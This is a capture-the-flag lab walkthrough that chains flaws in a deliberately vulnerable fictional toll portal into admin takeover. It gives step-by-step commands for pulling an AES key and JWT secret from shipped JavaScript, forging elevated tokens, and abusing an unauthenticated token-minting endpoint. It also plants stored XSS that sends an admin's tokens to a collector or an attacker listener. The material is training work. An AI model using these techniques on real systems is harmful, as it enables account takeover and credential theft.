# Path 2 — TollPay: frontend secrets to account takeover

TollPay is a fictional US toll account portal. Customers register, log in, store payment cards, pay tolls and read usage reports. The portal is deliberately basic HTML and CSS (red and black) so the only interesting surface is the JavaScript it ships. This path is based on two real findings: a client side AES key baked into a toll operator bundle, and an unauthenticated token minting endpoint that hands out a valid JWT for any account.

Same idea as Path 1: treat the shipped JavaScript as source code. This time the payoff is not RCE, it is full takeover of the administrator account.

## One origin, works by IP

Everything runs on a single port, `4000`. The portal reverse proxies the API under `/api` on the same origin, so there is nothing to configure: no `/etc/hosts`, no second port, no CORS wrangling, no CSP tuning, no certificates. Reach the lab by IP, hostname or localhost and the steps are identical.

Set one variable:

```bash
export TARGET=http://localhost:4000        # or http://YOUR_DROPLET_IP:4000
```

## Run everything through Burp

The whole point of this path is to watch and replay HTTP, so send all of it through Burp. Two ways, use whichever fits the step:

- **Browser.** Set your browser proxy to `127.0.0.1:8080` (FoxyProxy, or the browser settings). Every page you load and every form you submit now shows up in Burp HTTP history, ready to send to Repeater.
- **curl / scripts.** Add `-x http://127.0.0.1:8080` to any curl. The python scripts in `tollpay-solution/` already send through `127.0.0.1:8080`; set `TP_PROXY=` (empty) to turn that off.

Windows students: use `curl.exe` (the real curl, not the PowerShell alias), or just drop the request into Burp Repeater and edit it there. The python scripts run the same on Windows, macOS and Linux, so when a request needs a JSON body prefer the script or Repeater over fighting shell quoting.

## The solution scripts

They live in `tollpay-solution/`. Four small files, each does one thing:

| file | what it does | runs where |
|------|--------------|------------|
| `decode_envelope.py` | AES decrypt the login blob into a JWT | offline |
| `forge_jwt.py` | re-sign a JWT with a new scope | offline |
| `xss_payload.js` | the exploit that runs in the admin browser | in the bot |
| `plant_xss.py` | posts that payload as a stored task | through Burp |

Install the two libraries they need once:

```bash
pip install pycryptodome pyjwt requests
```

## Scenario

The client gave you one URL: `$TARGET`. Register a customer, read the bundle, climb from customer to moderator to administrator, and read the admin only settlement report. The flag is the MD5 in that report. Crack it with rockyou.txt.

## Win condition

The admin settlement report exposes a `settlementKey` that is an MD5 hash. You win by taking over the admin account, reading that value, and cracking it.

## Tools

- docker, curl, jq
- python3 with `pycryptodome`, `pyjwt`, `requests`
- Browser with DevTools, Burp Suite Community
- hashcat or john, rockyou.txt (seclists)

## Spin up (only this lab)

```bash
cd soundmetrics-range
docker compose -f docker-compose.tollpay.yml up -d --build
```

This starts three containers and nothing else. SoundMetrics stays down. A headless admin logs in and reviews the moderator task queue every 25 seconds. That admin is your victim.

---

## Solution

### Step 0: Read the bundle

The login page ships one chunk. Pull it with no login.

```bash
curl -x http://127.0.0.1:8080 -s $TARGET/ | grep -oE '/static/[^"]+\.js'
curl -x http://127.0.0.1:8080 -s $TARGET/static/app.4f2a9c7b.js
```

Read it like source. Two strings matter, both baked in at build time:

```
this.tokenFromUI = "T0llP4y_C1ient_K3y_AES256_2026!!";   // 32 chars = AES-256 key
this.signingKey  = "tollpay-signing-key-2026";           // HS256 secret
```

`tokenFromUI` is 32 ASCII characters, exactly an AES-256 key. `signingKey` sits in a dead `signRequest()` helper. It is the secret the API uses to sign its JWTs.

### Step 1: Register and log in

Do it in the browser with Burp recording: open `$TARGET`, register a customer, log in. In Burp you will see login is two requests. The first, `POST /api/v1/login`, answers with an `access_token` that is a base64 blob, not a JWT. The second hands that blob back to the portal to open the session.

After login, look at your `tp_session` cookie: it is that same blob, not a readable JWT. The portal decrypts it for itself on every request. To read or tamper your own token you have to decrypt it, and that needs the key from the bundle. There is no plaintext JWT handed to you anywhere.

Or by curl, straight to the API:

```bash
curl -x http://127.0.0.1:8080 -s -X POST $TARGET/api/v1/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"pentester","password":"test123","plate":"ABC123","state":"TX"}'

curl -x http://127.0.0.1:8080 -s -X POST $TARGET/api/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"pentester","password":"test123"}'
```

The `access_token` comes back as a base64 blob, not a JWT. It is AES-256-ECB encrypted with the key you just found.

### Step 2: Decrypt the token

Paste the blob into `decode_envelope.py`. The blob is either your `tp_session` cookie or the `access_token` from the login response, they are the same value.

```bash
python3 tollpay-solution/decode_envelope.py "<blob>"
```

Out comes a normal JWT. Its payload shows `scope` is `EXTERNAL`. This is your customer token, the credential the portal sends on every call.

### Step 3: Find the locked admin route

With that JWT as a Bearer token, the admin and moderator routes exist but reject your scope:

```bash
curl -x http://127.0.0.1:8080 -s -o /dev/null -w '%{http_code}\n' \
  $TARGET/api/v1/admin/report -H "Authorization: Bearer <customer jwt>"   # 401
curl -x http://127.0.0.1:8080 -s -o /dev/null -w '%{http_code}\n' \
  $TARGET/api/v1/tasks -H "Authorization: Bearer <customer jwt>"          # 401, moderators only
```

### Step 4: Re-sign the JWT as a moderator

You have the signing secret, so sign your own token with a higher scope. Paste the decoded payload from step 2 and the scope you want:

```bash
python3 tollpay-solution/forge_jwt.py \
  '{"accountId":"<your id>","username":"pentester","scope":"EXTERNAL","type":"access_token"}' \
  MODERATOR
```

(The script resets the token clock for you, so it stays valid for an hour.)

Check it works:

```bash
curl -x http://127.0.0.1:8080 -s $TARGET/api/v1/tasks \
  -H "Authorization: Bearer <moderator jwt>" | jq .
```

To browse the portal as this moderator, hand the token to the portal so it sets your session cookie, then copy `tp_session` into your browser:

```bash
curl -x http://127.0.0.1:8080 -s -X POST $TARGET/portal/session \
  -H 'Content-Type: application/json' -d '{"jwt":"<moderator jwt>"}' -i
```

Open `$TARGET/tasks`.

### Step 5: The moderator page leaks an internal API

The task page ships its own chunk, served only to moderator tier:

```bash
curl -x http://127.0.0.1:8080 -s $TARGET/static/tasks.9e1d55a0.js
```

It calls a TollTag provisioning helper:

```
/api/v1/customers/{accountId}/setuponlineaccesstolltag?SerialNumber={serial}
```

with a note that it mints a token from `accountId` plus `SerialNumber` only, and was never meant to reach customer browsers.

### Step 6: The internal API is unauthenticated

Call it with any account and its serial. No token. It returns a plaintext JWT and refresh token for that account:

```bash
curl -x http://127.0.0.1:8080 -s \
  "$TARGET/api/v1/customers/3000053203/setuponlineaccesstolltag?SerialNumber=TP.0003828042" | jq .
```

The catch: you need the admin's `accountId` and `serialNumber`, and you do not know them. The admin does. So make the admin hand them over.

### Step 7: Steal the admin identifiers with stored XSS

Task bodies render unsanitized and the headless admin reviews the queue, so your JavaScript runs in the admin's browser with the admin's session.

The exploit is one readable file, `tollpay-solution/xss_payload.js`. Read it: it loads the admin dashboard, scrapes the `accountId` and `serialNumber` the page renders, calls the mint endpoint from step 6 for the admin account, and sends the result to the lab's `/collect` drop. Everything is same origin, so there is no CORS to defeat.

`plant_xss.py` ships that file as a task. Give it the target, your moderator token, and any label for your drop:

```bash
python3 tollpay-solution/plant_xss.py $TARGET <moderator jwt> loot
```

It base64 wraps the payload so there is no quoting to get wrong, and the POST goes through Burp. Wait up to 25 seconds for the admin review loop, then read your drop:

```bash
curl -x http://127.0.0.1:8080 -s "$TARGET/collect?id=loot" | jq -r '.entries[0]' | base64 -d | jq .
```

Prefer your own listener over `/collect`? Run `python3 -m http.server 9999` and change the last line of `xss_payload.js` to point `new Image().src` at `http://YOUR_IP:9999/`. The drop lands in the access log. `/collect` exists so the lab works when you reach it by IP from behind NAT.

### Step 8: Refresh and become admin

The drop holds the admin `access_token` (scope `ADMIN`) and `refresh_token`. The access token is short lived, so refresh it for a fresh one:

```bash
curl -x http://127.0.0.1:8080 -s -X POST $TARGET/api/v1/token/refresh \
  -H 'Content-Type: application/json' \
  -d '{"refresh_token":"<admin refresh_token>"}' | jq .
```

### Step 9: Read the settlement report

```bash
curl -x http://127.0.0.1:8080 -s $TARGET/api/v1/admin/report \
  -H "Authorization: Bearer <fresh admin access_token>" | jq .
```

Or set it as your portal session and open `$TARGET/admin` in the browser:

```bash
curl -x http://127.0.0.1:8080 -s -X POST $TARGET/portal/session \
  -H 'Content-Type: application/json' -d '{"jwt":"<admin access_token>"}' -i
```

The report returns `settlementKey`, an MD5 hash.

### Step 10: Crack the flag

```bash
echo "f25a2fc72690b780b2a14e140ef6a9e0" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# cracks to: iloveyou
```

Flag is the cracked plaintext.

---

## Deploying to a DigitalOcean droplet

Resource note: two of the three containers are tiny Node services. The admin bot runs headless Chromium and is the heavy one, roughly 350 to 450 MB of RAM. Use a 1 GB droplet or larger. Only this lab needs to be running, so do not start SoundMetrics on the same box.

```bash
# on the droplet
git clone <your repo> && cd soundmetrics-range
docker compose -f docker-compose.tollpay.yml up -d --build

# open the one port
ufw allow 4000/tcp
```

Students then set `export TARGET=http://DROPLET_IP:4000` and follow the steps above unchanged. To reset the lab (clears registered users, tasks and the collector) run `docker compose -f docker-compose.tollpay.yml restart`.

---

## The vulnerabilities, in order

1. AES-256-ECB key shipped in the client bundle (`tokenFromUI`). Anyone can decrypt the token envelope.
2. JWT HS256 signing secret shipped in the same bundle (`signingKey`). Anyone can forge a token for any scope. Horizontal and vertical privilege escalation.
3. Internal, sensitive endpoint disclosed in the moderator bundle.
4. Unauthenticated token minting: `accountId` plus `SerialNumber` returns a valid JWT. No session, no password, no MFA.
5. Stored XSS in the task queue, reviewed by a privileged user, which reaches every same origin endpoint with the victim's session.

Each one is survivable alone. Chained, an anonymous visitor becomes admin.
